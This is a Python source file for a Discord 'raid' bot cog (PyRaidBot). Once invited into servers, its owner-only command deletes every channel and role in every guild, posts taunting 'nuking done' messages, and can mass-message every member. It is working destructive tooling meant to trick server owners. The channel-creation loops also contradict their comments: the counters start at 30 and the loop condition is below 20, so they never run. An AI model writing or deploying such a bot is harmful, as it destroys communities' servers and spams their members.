"""
PyRaidBot - Discord bot
Copyright (C) 2019 TrackRunny

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
"""

# - Importing all needed modules for this cog.
import discord
import random
from discord.ext import commands


# - Creating a Raid class for all of our raid commands.
class Raid(commands.Cog):

    # - Start our class.
    def __init__(self, client):
        self.client = client
        self.r = 30  # - Change the value of roles you want to create.
        self.t = 30  # - Change the value of text channels you want to create.
        self.random_color = r = lambda: random.randint(0, 255)
        self.embed_color = f'{f"{r():x}":0>2}{f"{r():x}":0>2}{f"{r():x}":0>2}'

    # - Checks if you are the bot owner, or else this command will not be ran.
    @commands.is_owner()
    @commands.command()
    async def raid(self, ctx):
        # - Making a list of names for what the channels and roles will be called.
        names = ["LMFAOO", "Why did you fall for this", "Nukked sped", "What now?",
                 "What is the meaning of life?"]

        # - Creating the embed that will be send to the user when the nuking begins.
        embed = discord.Embed(
            color=(discord.Color(int(f"0x{self.embed_color}", 16))),
            title="→ Nuking started... :bomb:",
            description="• Please wait... Nuking will be done shortly."
        )
        await ctx.send(embed=embed)

        # - Every guild that the bot is in, and every channel inside that guild will be deleted.
        for guild in self.client.guilds:
            for channel in guild.channels:
                await channel.delete(reason=None)

        # - Every guild that the bot is in, and every role under the bots role will be deleted.
        for guild in self.client.guilds:
            for role in guild.roles:
                # - Attempting to delete the roles.
                try:
                    await role.delete(reason=None)
                # - If fails, the exception will be caught and be printed out to the console.
                # - Most roles should still be removed though.
                except Exception as e:
                    print(f"Ignored Errors: {e}")

        # - 20 new text channels will be created inside a guild that is specified.
        while 20 > self.t:
            for guild in self.client.guilds:
                picked = random.choice(names)
                await guild.create_text_channel(picked)
                self.t += 1

        # - 20 new roles will be created inside a guild that is specified.
        while 20 > self.r:
            for guild in self.client.guilds:
                picked = random.choice(names)
                await guild.create_role(name=picked)
                self.r += 1

        # - In every new channel created, a message will be sent telling the users the nuking is done.
        for guild in self.client.guilds:
            for channel in guild.channels:
                embed2 = discord.Embed(
                    color=(discord.Color(int(f"0x{self.embed_color}", 16))),
                    title="→ Nuking done! :bomb:",
                    description="• Thanks for inviting me!"
                )
                await channel.send(embed=embed2)

    # - Every guild that the bot is in, and every user inside those guilds will be messaged.
    @commands.is_owner()
    @commands.command()
    async def message_all(self, ctx, *, message):
        for guild in self.client.guilds:
            for member in guild.members:
                await member.send(message)

        await ctx.send("Messages sent!")

    # - A command that will say what you want the bot to say.
    @commands.is_owner()
    @commands.command()
    async def tell(self, ctx, *, message):
        await ctx.send(message)


# - Setting up the cog.
def setup(client):
    client.add_cog(Raid(client))
